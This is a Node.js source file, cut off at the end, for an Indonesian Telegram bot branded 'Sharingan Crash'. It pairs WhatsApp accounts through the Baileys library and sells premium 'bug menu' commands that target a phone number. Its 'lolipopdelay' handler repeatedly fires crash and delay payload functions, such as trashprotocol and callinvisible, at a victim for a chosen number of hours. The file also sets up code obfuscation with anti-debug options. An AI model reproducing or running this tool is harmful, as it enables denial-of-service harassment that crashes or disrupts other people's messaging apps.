const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./database/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./database/admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./database/premium.json");
ensureFileExists("./database/admin.json");

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
  fs.writeFileSync("./database/premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./database/admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

watchFile("./database/premium.json", (data) => (premiumUsers = data));
watchFile("./database/admin.json", (data) => (adminUsers = data));

const axios = require("axios");
const chalk = require("chalk");
const config = require("./setting/config.js");
const TelegramBot = require("node-telegram-bot-api");

const BOT_TOKEN = config.BOT_TOKEN;
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/NPConTop/BOTALL/refs/heads/main/databasebot.json";
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("Memeriksa Token Anda 🔎"));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("Token Tidak Terdaftar Di Database❌...."));
    process.exit(1);
  }

  console.log(chalk.green(` Token Terdaftar Di Database✅...⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(
    chalk.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣷⠀⠀⢠⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⡇⠀⣸⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀
⠀⣠⣶⣦⡀⠹⣿⣿⣿⣿⡿⠁⠀⠘⣿⣿⣿⣿⣿⠇⣠⣴⣶⡄⠀
⢰⣿⣿⣿⣿⣆⠉⠛⠛⠋⠁⣀⣀⣀⠈⠛⠛⠛⠁⣼⣿⣿⣿⣿⡀
⢸⣿⣿⣿⣿⣿⡆⠀⢀⣴⣿⣿⣿⣿⣿⣦⠀⠀⢸⣿⣿⣿⣿⣿⡇
⠈⢿⣿⣿⣿⣿⠃⣠⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢸⣿⣿⣿⣿⠟⠀
⠀⠀⠉⠙⠋⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣍⠛⠋⠁⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⡿⠿⢿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀ 

𝐒𝐇𝐀𝐑𝐈𝐍𝐆𝐀𝐍 𝐂𝐑𝐀𝐒𝐇\`
𝐒𝐂𝐑𝐈𝐏𝐓 𝐁𝐘 𝐕𝐈𝐗𝐙𝐙
=========================================
`)
  );

  console.log(
    chalk.red(`
𝐖𝐄𝐋𝐋𝐂𝐎𝐌𝐄 𝐌𝐘 𝐁𝐔𝐘𝐄𝐑 👋
`)
  );

  console.log(
    chalk.red(`
𝐁𝐎𝐓 𝐈𝐒 𝐑𝐔𝐍𝐈𝐍𝐆
`)
  );
}


let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Loading...\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Mennghubungkan\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Gagal Tersambung\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤Pesan : Succes Pairing\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing\`\`\`
╰➤ Kode : \`\`${formattedCode}\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Erorr❌
*╰➤ Pesan* : ${error.message}\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

//-# Fungsional Function Before Parameters

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `𝐏𝐑𝐄𝐌𝐈𝐔𝐌 - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "𝐍𝐎 𝐏𝐑𝐄𝐌𝐈𝐔𝐌";
  }
}

// Get Random Image
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/u8e12w.png",
    "https://files.catbox.moe/u8e12w.png",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}

// ~ Enc Xopwn Confugurasi
const getVincentObfuscationConfig = () => {
  const generateSiuCalcrickName = () => {
    // Identifier generator pseudo-random tanpa crypto
    const chars =
      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let randomPart = "";
    for (let i = 0; i < 6; i++) {
      // 6 karakter untuk keseimbangan
      randomPart += chars[Math.floor(Math.random() * chars.length)];
    }
    return `//MAKLUENC 和无气${randomPart}`;
  };

  return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,
    stringEncoding: true,
    stringSplitting: true,
    controlFlowFlattening: 0.95,
    shuffle: true,
    rgf: false,
    flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
      selfDefending: true,
      antiDebug: true,
      integrity: true,
      tamperProtection: true,
    },
  };
};

// #Progres #1
const createProgressBar = (percentage) => {
  const total = 10;
  const filled = Math.round((percentage / 100) * total);
  return "▰".repeat(filled) + "▱".repeat(total - filled);
};


// [ BUG FUNCTION ]



function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`
╭──[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──────
│ 𝐒𝐇𝐀𝐑𝐈𝐍𝐆𝐀𝐍🐉
│ 友 𝐃𝐄𝐕 : @Jenzzofficial
│ 友 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.2
│ 友 𝐑𝐔𝐍 : ${runtime}
╰━━━ㅡ───────────────
Silahkan Pilih Menu Di Bawah
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐔𝐆-𝐌𝐄𝐍𝐔🐉", callback_data: "bug_menu" }],
        [{ text: "𝐁𝐔𝐆-𝐌𝐄𝐍𝐔𝟐 🦠", callback_data: "bug_menu2" }],
        [{ text: "𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍", url: "https://t.me/Jenzzofficial" }],
        [
          { text: "𝐎𝐖𝐍𝐄𝐑-𝐌𝐄𝐍𝐔⚡", callback_data: "owner_menu" },
          { text: "𝐓𝐇𝐀𝐍𝐊𝐒 🤝", callback_data: "tqto_menu" },
          { text: "OWNER", url: "https://t.me/Jenzzofficial" },
        ],
      ],
    },
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;
    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "bug_menu") {
      caption = `\`\`\`
╭──[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──────
│ 𝐒𝐇𝐀𝐑𝐈𝐍𝐆𝐀𝐍🐉
│ 友 𝐃𝐄𝐕 : @Jenzzofficial
│ 友 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.2
│ 友 𝐑𝐔𝐍 : ${runtime}
╰━━━ㅡ───────────────
╭─────[ 𝐁𝐔𝐆 𝐋𝐈𝐒𝐓 ]─────
│ /ᴊᴇɴᴢᴢ-ᴄʀᴀsʜ 62××
│ /ᴊᴇɴᴢᴢ-ᴄʀᴀsʜ1 62××
│ /ᴊᴇɴᴢᴢ-ᴄʀᴀsʜ2 62××
│ /ᴊᴇɴᴢᴢ-ᴄʀᴀsʜ3 62××
╰━━━ㅡ────────────
\`\`\``;
      replyMarkup = {
        inline_keyboard: [[{ text: "𝐁𝐀𝐂𝐊", callback_data: "back" }]],
      };
    }

if (query.data === "bug_menu2") {
      caption = `\`\`\`
╭──[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──────
│ 𝐒𝐇𝐀𝐑𝐈𝐍𝐆𝐀𝐍🐉
│ 友 𝐃𝐄𝐕 : @Jenzzofficial
│ 友 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.2
│ 友 𝐑𝐔𝐍 : ${runtime}
╰━━━ㅡ───────────────
╭─────[ 𝐁𝐔𝐆 𝐋𝐈𝐒𝐓 ]─────
│ /sʜᴀʀɪɴɢᴀɴ-ᴄʀᴀsʜ 62××
│ /sʜᴀʀɪɴɢᴀɴ-ᴄʀᴀsʜ1 62××
│ /sʜᴀʀɪɴɢᴀɴ-ᴄʀᴀsʜ2 62××
│ /sʜᴀʀɪɴɢᴀɴ-ᴄʀᴀsʜ3 62××
╰━━━ㅡ────────────
\`\`\``;
      replyMarkup = {
        inline_keyboard: [[{ text: "𝐁𝐀𝐂𝐊", callback_data: "back" }]],
      };
    }
    
    if (query.data === "owner_menu") {
      caption = `\`\`\`
╭──[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──────
│ 𝐒𝐇𝐀𝐑𝐈𝐍𝐆𝐀𝐍🐉
│ 友 𝐃𝐄𝐕 : @Jenzzofficial
│ 友 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.2
│ 友 𝐑𝐔𝐍 : ${runtime}
╰━━━ㅡ───────────────
╭─────[ 𝐎𝐖𝐍𝐄𝐑 ]────────
│ /ᴀᴅᴅᴏᴡɴᴇʀ 
│ /ᴀᴅᴅᴘʀᴇᴍ 
│ /ᴅᴇʟᴏᴡɴᴇʀ 
│ /ᴅᴇʟᴘʀᴇᴍ 
│ /ᴄᴏɴɴᴇᴄᴛ 628××
╰━━━ㅡ────────────────
\`\`\``;
      replyMarkup = {
        inline_keyboard: [[{ text: "𝐁𝐀𝐂𝐊", callback_data: "back" }]],
      };
    }

if (query.data === "tqto_menu") {
      caption = `\`\`\`
╭──[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]─────────
│ 𝐒𝐇𝐀𝐑𝐈𝐍𝐆𝐀𝐍🐉
│ 友 𝐃𝐄𝐕 : @Jenzzofficial
│ 友 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.2
│ 友 𝐑𝐔𝐍 : ${runtime}
╰━━━ㅡ───────────────────
╭───────────────────────
│     [   𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎    ]    
│ 𝐉𝐄𝐍𝐙𝐙 - 𝐃𝐄𝐕
│ 𝐓𝐄𝐍𝐊𝐀𝐂𝐇𝐀𝐀𝐍 - 𝐒𝐔𝐏𝐎𝐑𝐓
│ 𝐕𝐈𝐗𝐙𝐙 - 𝐓𝐄𝐀𝐂𝐇𝐄𝐑
│ 𝐀𝐘𝐀𝐇/𝐈𝐁𝐔 - 𝐅𝐀𝐌𝐈𝐋𝐘
│ 𝐀𝐋𝐋 𝐌𝐘 𝐁𝐔𝐘𝐄𝐑 
╰━━━ㅡ────────────────────
\`\`\``;
      replyMarkup = {
        inline_keyboard: [[{ text: "𝐁𝐀𝐂𝐊", callback_data: "back" }]],
      };
    }
    
    if (query.data === "back") {
      caption = `\`\`\`
╭──[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──────
│ 𝐒𝐇𝐀𝐑𝐈𝐍𝐆𝐀𝐍🐉
│ 友 𝐃𝐄𝐕 : @Jenzzofficial
│ 友 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.2
│ 友 𝐑𝐔𝐍 : ${runtime}
╰━━━ㅡ───────────────
Silahkan Pilih Menu Di Bawah
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "𝐁𝐔𝐆-𝐌𝐄𝐍𝐔🐉", callback_data: "bug_menu" }],
          [{ text: "𝐁𝐔𝐆-𝐌𝐄𝐍𝐔𝟐 🦅", callback_data: "bug_menu2" }],
          [{ text: "𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍", url: "https://t.me/Jenzzofficial" }],
        [
          { text: "𝐎𝐖𝐍𝐄𝐑-𝐌𝐄𝐍𝐔⚡", callback_data: "owner_menu" },
          { text: "𝐓𝐇𝐀𝐍𝐊𝐒 🤝", callback_data: "tqto_menu" },
          { text: "OWNER", url: "https://t.me/Jenzzofficial" },
          ],
        ],
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "Markdown",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
//=======CASE BUG=========//
bot.action("lolipopdelay", checkWhatsAppConnection, checkOwner, async (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");
  const targetNumber = args[1];
  const duration = parseInt(args[2]);

  if (!targetNumber || isNaN(duration)) {
    return ctx.reply("Contoh: /lolipopdelay 628xxx 1 (durasi dalam jam)");
  }

  const target = targetNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const chatId = ctx.chat.id;

  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[█░░░░░░░░░] 10%",
    "[██░░░░░░░░] 20%",
    "[███░░░░░░░] 30%",
    "[████░░░░░░] 40%",
    "[█████░░░░░] 50%",
    "[██████░░░░] 60%",
    "[███████░░░] 70%",
    "[████████░░] 80%",
    "[█████████░] 90%",
    "[██████████] 100%",
  ];

  const sentMessage = await ctx.sendPhoto(prosesImg, {
    caption: `\`\`\`
▢ Target : ${targetNumber}
▢ Status : Prosessing
▢ Durasi : ${duration} Jam
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${progressStages[0]}

© 𝐙𝐄𝐍𝐈𝐓𝐇 
\`\`\``,
    parse_mode: "Markdown",
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise((r) => setTimeout(r, 2000));
    try {
      await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, undefined,
        `\`\`\`
▢ Target : ${targetNumber}
▢ Status : Prosessing
▢ Durasi : ${duration} Jam
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${progressStages[i]}

© 𝐙𝐄𝐍𝐈𝐓𝐇
\`\`\``,
        { parse_mode: "Markdown" }
      );
    } catch (e) {}
  }

  const endTime = Date.now() + duration * 60 * 60 * 1000;

  const loop = async () => {
    if (Date.now() >= endTime) {
    
      await ctx.telegram.editMessageMedia(
        chatId,
        sentMessage.message_id,
        undefined,
        {
          type: "photo",
          media: successImg,
          caption: `\`\`\`
▢ Target : ${targetNumber}
▢ Status : Successfully
▢ Durasi : ${duration} Jam
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%

© 𝐙𝐄𝐍𝐈𝐓𝐇
\`\`\``,
          parse_mode: "Markdown",
        },
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "⟅ Cek Target ⟆", url: `https://wa.me/${targetNumber}` }],
            ],
          },
        }
      );
      return;
    }

    try {
      await Promise.all([
        callinvisible(target),
        sleep(3000),
        betadelayNew(target, true),
        sleep(3000),
        delaybeta(target),
        sleep(3000),
        trashprotocol(target, true),
        sleep(3000),
        delayNew(target, true),
        sleep(3000),
        callinvisibleV2(target),
        sleep(3000),
      ]);
    } catch (e) {
      console.log("Error:", e.message);
    }

    setTimeout(loop, 1000);
  };

  loop();
});
//=======plugins=======//
bot.onText(/\/connect (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 7579095053 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 7579095053 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 7579095053 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /addowner 7579095053."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /addowner 7579095053."
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah pengguna adalah owner atau admin
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to remove premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Please provide a user ID. Example: /delprem 7579095053"
    );
  }

  const userId = parseInt(match[1]);

  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number."
    );
  }

  // Cari index user dalam daftar premium
  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `❌ User ${userId} is not in the premium list.`
    );
  }

  // Hapus user dari daftar
  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
